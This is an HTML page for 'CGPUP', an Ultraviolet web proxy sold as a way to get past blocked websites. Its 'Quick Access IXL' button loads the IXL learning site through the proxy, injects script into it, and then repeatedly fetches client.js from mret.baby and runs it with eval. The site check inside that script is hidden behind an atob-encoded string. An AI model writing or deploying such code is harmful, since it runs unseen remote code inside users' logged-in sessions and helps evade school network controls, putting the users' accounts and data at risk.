<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no" />
  <title>CGPUP</title>
  <meta
    name="description"
    content="Crafted Gamz Private Unblocked Proxy (CGPUP) is a free web proxy service powered by Ultraviolet, designed to help you bypass internet restrictions and access blocked websites securely and privately."
  />
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#434c5e" />
  <meta name="googlebot" content="index, follow, snippet" />
  <link rel="shortcut icon" href="https://cgamz.site/favicon.png" type="image/x-icon" />
  <link rel="stylesheet" href="index.css" />
  <script src="baremux/index.js" defer></script>
  <script src="epoxy/index.js" defer></script>
  <script src="uv/uv.bundle.js" defer></script>
  <script src="uv/uv.config.js" defer></script>
  <script src="register-sw.js" defer></script>
  <script src="search.js" defer></script>
  <script src="index.js" defer></script>

  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: sans-serif;
      overflow-x: hidden;
      background: none;
      background-color: #000; /* Optional dark background */
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      color: white;
    }

    iframe#uv-frame {
      width: 100vw;
      height: 100vh;
      border: none;
      position: fixed;
      top: 0;
      left: 0;
      z-index: 0;
    }

    #quickIxlBtn {
      position: fixed;
      bottom: 20px;
      right: 20px;
      z-index: 999;
      background: #4bf9ed;
      color: black;
      border: none;
      border-radius: 8px;
      padding: 10px 20px;
      cursor: pointer;
      font-weight: bold;
      font-size: 16px;
      box-shadow: 0 0 10px #4bf9ed;
      user-select: none;
    }

    #quickIxlBtn:hover {
      background: #39c6d2;
      box-shadow: 0 0 20px #39c6d2;
    }
  </style>
</head>

<body>

  <iframe id="uv-frame" style="display:none;"></iframe>

  <button id="quickIxlBtn" title="Open IXL">Quick Access IXL</button>

  <script>
    document.getElementById('quickIxlBtn').addEventListener('click', async () => {
      const frame = document.getElementById('uv-frame');
      if (!frame) return alert('Proxy iframe not found.');

      if (typeof __uv$config === 'undefined') return alert('Ultraviolet config not loaded.');

      const targetUrl = 'https://www.ixl.com/';
      const uvUrl = __uv$config.prefix + __uv$config.encodeUrl(targetUrl);
      frame.style.display = 'block';
      frame.src = uvUrl;

      await new Promise(res => setTimeout(res, 5000));

      if (!frame.contentWindow) return alert('Proxy iframe contentWindow not accessible.');

      frame.contentWindow.eval(`(async()=>{
        const realUrl = __uv$config.decodeUrl(location.pathname.slice(__uv$config.prefix.length));
        if (!realUrl.includes(atob("aXhsLmNvbQ=="))) return alert("wrong site");
        if (window.mret) return alert("mret already loaded");
        window.mret = { api: "https://mret.baby/" };
        let f = document.createElement("iframe");
        f.src = "/dv3/" + Math.random().toString(36).slice(2);
        f.style.display = "none";
        f.id = "MretContext";
        document.body.appendChild(f);
        let w = f.contentWindow;
        window.mret.context = f;
        window.mret.fetch = w.fetch.bind(w);
        let i = setInterval(async () => {
          let r = await window.mret.fetch(window.mret.api + "client.js?" + Date.now());
          if (200 === r.status) {
            clearInterval(i);
            eval(await r.text());
          }
        }, 1000);
      })();`);
    });
  </script>

</body>
</html>
